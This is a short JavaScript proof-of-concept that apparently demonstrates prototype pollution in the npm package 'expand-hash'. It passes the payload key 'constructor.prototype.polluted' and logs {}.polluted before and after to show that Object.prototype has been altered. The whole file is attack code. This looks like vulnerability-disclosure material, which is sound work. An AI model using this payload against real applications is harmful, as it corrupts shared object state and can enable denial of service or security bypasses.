var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var expandHash = require('expand-hash');
var obj = {};
console.log({}.polluted);
expandHash({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);